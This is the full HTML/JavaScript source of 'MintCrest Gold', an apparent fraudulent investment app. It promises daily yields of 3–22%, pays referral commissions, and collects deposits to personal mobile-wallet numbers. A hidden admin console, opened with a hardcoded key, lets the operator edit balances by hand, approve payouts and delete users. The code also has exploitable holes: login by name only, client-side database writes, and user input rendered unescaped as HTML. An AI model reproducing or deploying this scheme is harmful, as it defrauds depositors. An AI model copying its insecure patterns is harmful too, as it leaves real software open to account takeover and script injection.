<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Professional Asset Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.07); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: slideUp 0.3s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .badge-pending { background: rgba(234, 179, 8, 0.1); color: #eab308; padding: 2px 4px; border-radius: 4px; font-size: 7px; font-weight: bold; text-transform: uppercase; }
        .badge-approved { background: rgba(34, 197, 94, 0.1); color: #4ade80; padding: 2px 4px; border-radius: 4px; font-size: 7px; font-weight: bold; text-transform: uppercase; }
        .badge-rejected { background: rgba(239, 68, 68, 0.1); color: #ef4444; padding: 2px 4px; border-radius: 4px; font-size: 7px; font-weight: bold; text-transform: uppercase; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; animation: marquee 15s linear infinite; white-space: nowrap; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="promo-ticker" class="hidden bg-blue-600/20 border-b border-blue-500/30 py-2 overflow-hidden z-[500]">
        <div class="animate-marquee text-[9px] font-black uppercase tracking-widest text-blue-400">
            📢 <span id="ticker-text">Welcome to MintCrest Gold - Secure Your Future Today!</span>
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-2 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12 font-bold italic">Official Digital Asset Vault</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-4 focus:border-blue-500 transition-all">
                <input type="text" id="ref-by" placeholder="Referral Name (Optional)" class="w-full bg-white/5 p-4 rounded-xl border border-white/5 outline-none text-center text-[10px] mb-6 font-bold">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-2xl active:scale-95 transition-all">Secure Access</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 shadow-xl">
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Available Capital</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[9px] font-black text-yellow-500 uppercase italic">System Syncing...</div>
                <div class="mt-6 flex gap-3">
                    <span class="text-[8px] bg-green-500/10 text-green-400 px-4 py-2 rounded-full font-bold border border-green-500/20 uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                    <span id="tier-tag" class="text-[8px] bg-white/5 text-gray-400 px-4 py-2 rounded-full font-bold uppercase italic border border-white/5">No Active Fleet</span>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 transition-transform">📥 <span class="text-[9px] font-black block mt-2 uppercase tracking-widest">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 transition-transform">📤 <span class="text-[9px] font-black block mt-2 uppercase tracking-widest">Withdraw</span></button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-xl tracking-widest">Trading Fleet</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400">Security Ledger</h2>
            <div id="user-history" class="space-y-2 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="glass p-8 rounded-[3rem] border-t-4 border-blue-500">
                <h3 class="text-blue-500 font-black text-[11px] uppercase mb-2 text-center italic">Referral ID</h3>
                <div id="my-ref-id" class="text-center font-black text-lg py-2 text-white">---</div>
                <p class="text-[7px] text-center text-gray-500 uppercase">Share your name to earn 10% commission!</p>
            </div>
            <div class="glass p-8 rounded-[3rem] border-t-4 border-yellow-500">
                <h3 class="text-yellow-500 font-black text-[11px] uppercase mb-2 text-center italic">Reward Center</h3>
                <input type="text" id="promo-input" placeholder="Enter Promo Code..." class="w-full bg-white/5 p-4 rounded-2xl text-[10px] border border-white/10 outline-none mb-4 text-center font-bold uppercase">
                <button onclick="applyPromoRequest()" class="w-full bg-yellow-600 py-4 rounded-2xl font-black text-[10px] uppercase shadow-lg active:scale-95 transition-all">Submit Code</button>
            </div>
            <div class="glass p-8 rounded-[3rem] text-center border-b-4 border-green-500">
                <h3 class="text-green-500 font-black text-[10px] uppercase mb-2">Official Community</h3>
                <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" class="inline-block bg-white/5 border border-green-500/30 px-8 py-3 rounded-2xl font-black text-[9px] uppercase tracking-widest">📢 Join Group</a>
            </div>
            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-red-500 uppercase">Terminate Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] text-center border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm italic">Capital Funding</h3>
                <div class="space-y-3 mb-10 text-[10px] font-black text-left">
                    <div class="glass p-5 rounded-2xl flex justify-between"><span>JAZZCASH/SADAPAY</span><span class="text-blue-400">03705519562</span></div>
                    <div class="glass p-5 rounded-2xl flex justify-between"><span>EASYPAISA</span><span class="text-green-400">03379827882</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none border border-white/5">
                <input type="text" id="dep-trx" placeholder="TID (Transaction ID)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold uppercase outline-none border border-white/5">
                <label class="block w-full bg-white/5 p-5 rounded-2xl mb-8 border border-dashed border-white/20 cursor-pointer">
                    <span id="file-label" class="text-[9px] font-bold opacity-50 uppercase italic">📸 Upload Screenshot Proof</span>
                    <input type="file" id="dep-proof" accept="image/*" class="hidden" onchange="document.getElementById('file-label').innerText = 'Screenshot Ready ✅'">
                </label>
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[10px] uppercase shadow-lg">Verify Funding</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600 text-center shadow-2xl">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm italic">Request Payout</h3>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none border border-white/5">
                <input type="text" id="wd-acc" placeholder="Account Name & Number" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center text-[9px] font-bold outline-none border border-white/5">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[10px] uppercase shadow-lg">Authorize Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Master Console 2.0</h2>
            <button onclick="closeAdmin()" class="bg-red-500/10 text-red-500 px-6 py-2 rounded-xl text-[10px] font-black uppercase">Exit</button>
        </div>

        <div class="grid grid-cols-2 gap-3 mb-8">
            <div class="glass p-4 rounded-2xl border-b-2 border-blue-500 text-center">
                <p class="text-[7px] text-gray-500 uppercase font-black">Total Users</p>
                <span id="adm-stat-users" class="text-blue-500 font-black text-sm">0</span>
            </div>
            <div class="glass p-4 rounded-2xl border-b-2 border-green-500 text-center">
                <p class="text-[7px] text-gray-500 uppercase font-black">Vault Capital</p>
                <span id="adm-stat-cap" class="text-green-500 font-black text-sm">₨ 0</span>
            </div>
        </div>
        
        <div class="flex gap-2 mb-8 overflow-x-auto">
            <button onclick="showAdmTab('requests')" class="bg-blue-600 px-6 py-2 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">Orders/TID</button>
            <button onclick="showAdmTab('users')" class="glass px-6 py-2 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">User List</button>
            <button onclick="showAdmTab('control')" class="bg-red-600 px-6 py-2 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">System Lock</button>
        </div>

        <div id="adm-sec-requests" class="adm-tab space-y-3"></div>

        <div id="adm-sec-users" class="adm-tab hidden space-y-3">
            <input type="text" id="user-search" oninput="filterUsers()" placeholder="Search User..." class="w-full bg-white/5 p-4 rounded-xl mb-4 text-[10px] font-bold border border-white/10 outline-none">
            <div id="user-list-container" class="space-y-3"></div>
        </div>

        <div id="adm-sec-control" class="adm-tab hidden space-y-4">
            <div class="glass p-8 rounded-[3rem] border-t-4 border-yellow-500 text-center">
                <h3 class="text-yellow-400 font-black text-[10px] uppercase mb-4">Broadcast Message</h3>
                <textarea id="bc-msg" class="w-full bg-white/5 p-4 rounded-2xl text-[10px] border border-white/10 outline-none mb-3"></textarea>
                <button onclick="sendBroadcast()" class="w-full bg-yellow-600 py-3 rounded-xl font-black text-[9px] uppercase">Update App Ticker</button>
            </div>
            <div class="glass p-8 rounded-[3rem] border-t-4 border-blue-600">
                <h3 class="text-blue-500 font-black text-[10px] uppercase mb-4 text-center">Manual Fund Control</h3>
                <input type="text" id="adm-user" placeholder="User Name" class="w-full bg-white/5 p-4 rounded-xl mb-2 text-center text-[10px] font-bold border border-white/5 outline-none">
                <input type="number" id="adm-val" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center text-[10px] font-bold border border-white/5 outline-none text-white">
                <div class="grid grid-cols-2 gap-2">
                    <button onclick="manualEdit('balance', 1)" class="bg-blue-600 py-3 rounded-xl font-black text-[9px] uppercase">Add</button>
                    <button onclick="manualEdit('balance', -1)" class="bg-red-600 py-3 rounded-xl font-black text-[9px] uppercase">Minus</button>
                </div>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem] shadow-2xl">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab">🏠<span class="text-[8px] font-black uppercase">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2">📈<span class="text-[8px] font-black uppercase">Fleet</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2">📜<span class="text-[8px] font-black uppercase">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2">🏢<span class="text-[8px] font-black uppercase">Firm</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3 }, { n: "Micro-Elite II", p: 500, r: 3.2 },
            { n: "Bronze-S", p: 1000, r: 3.5 }, { n: "Bronze-X", p: 2000, r: 3.8 },
            { n: "Silver-S", p: 3000, r: 4.2 }, { n: "Silver-X", p: 5000, r: 4.5 },
            { n: "Gold-S", p: 7000, r: 5 }, { n: "Gold-X", p: 10000, r: 5.5 },
            { n: "Gold-Master", p: 15000, r: 6 }, { n: "Platinum-S", p: 20000, r: 6.5 },
            { n: "Platinum-X", p: 30000, r: 7 }, { n: "Diamond-S", p: 40000, r: 7.5 },
            { n: "Diamond-X", p: 50000, r: 8 }, { n: "Royal-S", p: 75000, r: 9 },
            { n: "Royal-Grand", p: 100000, r: 10 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, s: true },
            { n: "🚀 ROCKET PRO", p: 12000, r: 18, s: true },
            { n: "👑 CROWN KING", p: 25000, r: 22, s: true }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000); 
            listenForAppUpdates();
        };

        function listenForAppUpdates() {
            db.collection("app_data").doc("announcement").onSnapshot(doc => {
                if(doc.exists) {
                    document.getElementById('promo-ticker').classList.remove('hidden');
                    document.getElementById('ticker-text').innerText = doc.data().message;
                }
            });
        }

        async function login() {
            const name = document.getElementById('user-name').value.trim(); 
            const refBy = document.getElementById('ref-by').value.trim();
            if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Inactive", referredBy: refBy || "Direct" });
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); document.getElementById('my-ref-id').innerText = name;
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); document.getElementById('tier-tag').innerText = user.tierName; checkProfitReq(user); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = snap.empty ? '<p class="text-center opacity-20 py-20 text-[9px] font-black uppercase italic">No Activities</p>' : '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { 
                    const clr = d.type.includes('dep') ? 'border-blue-500' : (d.type.includes('Profit') ? 'border-green-500' : (d.type.includes('Promo') ? 'border-yellow-500' : 'border-red-500')); 
                    list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center border-l-4 ${clr} mb-2 text-[9px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px]">${new Date(d.time).toLocaleString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="badge-${d.status}">${d.status}</span></div></div>`; 
                });
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                const style = p.s ? 'background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(147, 51, 234, 0.1)); border: 1px solid rgba(59, 130, 246, 0.3) !important;' : '';
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-5 rounded-[2.5rem] flex justify-between items-center active:scale-95 cursor-pointer mb-2" style="${style}"><div><h4 class="font-black text-[10px] uppercase ${p.s ? 'text-blue-400' : 'text-gray-400'}">${p.n}</h4><p class="text-[8px] text-green-400 font-bold uppercase">${p.r}% Daily Yield</p></div><div class="text-right"><p class="font-black text-[12px]">₨ ${p.p.toLocaleString()}</p></div></div>`;
            });
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; const f = document.getElementById('dep-proof');
            if(!a || !t || !f.files[0]) return alert("Missing Details!");
            const r = new FileReader(); r.readAsDataURL(f.files[0]); r.onload = async () => {
           await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: r.result, type: "deposit", status: "pending", time: Date.now(), referredBy: user.referredBy || "Direct" });
                alert("Deposit Requested, Sweetie!"); changePage('activity');
            };
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; if(!a || !acc || parseInt(a) > user.balance) return alert("Invalid Request!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) }); alert("Requested!"); changePage('activity');
        }

        async function applyPromoRequest() {
            const code = document.getElementById('promo-input').value.trim(); if(!code) return;
            await db.collection("requests").add({ user: user.name, amount: 0, type: "Promo Request: "+code, status: "pending", time: Date.now() });
            alert("Promo Submitted!");
        }

        async function buy(p, roi, tName) {
            if(user.balance < p) return alert("Low Funds!");
            if(confirm("Activate "+tName+"?")) { 
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tName, lastReqTime: Date.now() }); 
                alert("Success!"); changePage('activity');
            }
        }

        async function checkProfitReq(u) { if (u.activeTier > 0 && (Date.now() - u.lastReqTime) >= 86400000) { const amt = (u.activeTier * u.tierROI) / 100; await db.collection("requests").add({ user: u.name, amount: amt, type: "Daily Profit Yield", status: "pending", time: Date.now() }); await db.collection("users").doc(u.name).update({ lastReqTime: Date.now() }); } }
        function updateCountdown() { if (user && user.activeTier > 0) { const d = (user.lastReqTime + 86400000) - Date.now(); if(d>0) { const h = Math.floor(d/3600000); const m = Math.floor((d%3600000)/60000); const s = Math.floor((d%60000)/1000); document.getElementById('countdown-display').innerText = `YIELD IN: ${h}H ${m}M ${s}S`; } else { document.getElementById('countdown-display').innerText = "YIELD READY"; } } else { document.getElementById('countdown-display').innerText = "SYSTEM IDLE"; } }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } setTimeout(()=>tapCount=0,3000); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showAdmTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('adm-sec-'+t).classList.remove('hidden'); }

        // --- MASTER ADMIN LOGIC ---
        async function syncAdmin() {
            db.collection("users").onSnapshot(snap => {
                document.getElementById('adm-stat-users').innerText = snap.size;
                let total = 0; snap.forEach(d => total += (d.data().balance || 0));
                document.getElementById('adm-stat-cap').innerText = "₨ " + total.toLocaleString();
                const list = document.getElementById('user-list-container'); list.innerHTML = '';
                snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center text-[8px] font-black uppercase user-card" data-name="${u.name}"><div>${u.name}<br><span class="text-green-400">Bal: ${u.balance}</span></div><button onclick="deleteUser('${u.name}')" class="text-red-500 font-bold">❌</button></div>`; });
            });

            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => {
                    const d = doc.data(); let info = "";
                    if(d.type === 'deposit') info = `<div class="mt-2 text-blue-400 font-bold">TID: ${d.tid}</div><button onclick="viewProof('${d.proof}')" class="mt-2 bg-blue-500/20 text-blue-400 border border-blue-500/30 px-3 py-1 rounded-lg text-[7px]">VIEW PROOF 📸</button>`;
                    else if(d.type === 'withdraw') info = `<div class="mt-2 text-red-400 italic font-bold">ACC: ${d.acc}</div>`;
                    list.innerHTML += `<div class="glass p-5 rounded-3xl border-l-4 ${d.type==='deposit'?'border-blue-500':'border-red-500'} mb-4"><div class="flex justify-between items-start"><div class="text-[9px] font-black uppercase">USER: ${d.user}<br>TYPE: ${d.type}<br><span class="text-lg">₨ ${d.amount}</span>${info}</div><div class="flex flex-col gap-2"><button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-4 py-2 rounded-xl text-[8px] font-black">APPROVE</button><button onclick="handle('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="bg-red-600 px-4 py-2 rounded-xl text-[8px] font-black">REJECT</button></div></div></div>`;
                });
            });
        }

        async function handle(id, u, amt, act, type) { 
            const ref = db.collection("users").doc(u); const doc = await ref.get(); const data = doc.data();
            const reqRef = db.collection("requests").doc(id);
            const reqSnap = await reqRef.get();
            const reqData = reqSnap.data();
            let finalAmt = amt;

            if(act==='approved') {
                if(type.includes('Promo Request')) {
                    const bonus = prompt("Enter Bonus Amount for this promo:");
                    if(!bonus) return;
                    finalAmt = parseInt(bonus);
                }
                
                if(type==='deposit' || type.includes('Profit') || type.includes('Promo')) {
                    await ref.update({ balance: (data.balance||0) + finalAmt });
                    // Referral Commission
                    if(type==='deposit' && reqData.referredBy && reqData.referredBy !== "Direct") {
                        const rUser = db.collection("users").doc(reqData.referredBy);
                        const rDoc = await rUser.get();
                        if(rDoc.exists) {
                            const comm = finalAmt * 0.10;
                            await rUser.update({ balance: (rDoc.data().balance||0) + comm });
                            await db.collection("requests").add({ user: reqData.referredBy, amount: comm, type: "Ref Commission from "+u, status: "approved", time: Date.now() });
                        }
                    }
                }
            } else if(act==='rejected' && type==='withdraw') {
                await ref.update({ balance: (data.balance||0) + amt });
            }
            await reqRef.update({ status: act, amount: finalAmt }); 
        }

        async function manualEdit(field, mult) {
            const u = document.getElementById('adm-user').value; const v = parseInt(document.getElementById('adm-val').value) * mult;
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(d.exists) { await ref.update({ [field]: (d.data()[field] || 0) + v }); alert("Updated, Sweetie!"); }
        }

        function filterUsers() { const q = document.getElementById('user-search').value.toLowerCase(); document.querySelectorAll('.user-card').forEach(c => c.style.display = c.dataset.name.toLowerCase().includes(q) ? 'flex' : 'none'); }
        function viewProof(s) { const w = window.open(""); w.document.write(`<body style="margin:0;background:#000;display:flex;justify-content:center;"><img src="${s}" style="max-width:100%;"></body>`); }
        async function sendBroadcast() { const m = document.getElementById('bc-msg').value; await db.collection("app_data").doc("announcement").set({ message: m }); alert("Broadcast Sent!"); }
        async function deleteUser(n) { if(confirm("Delete user "+n+"?")) await db.collection("users").doc(n).delete(); }
    </script>
</body>
</html>
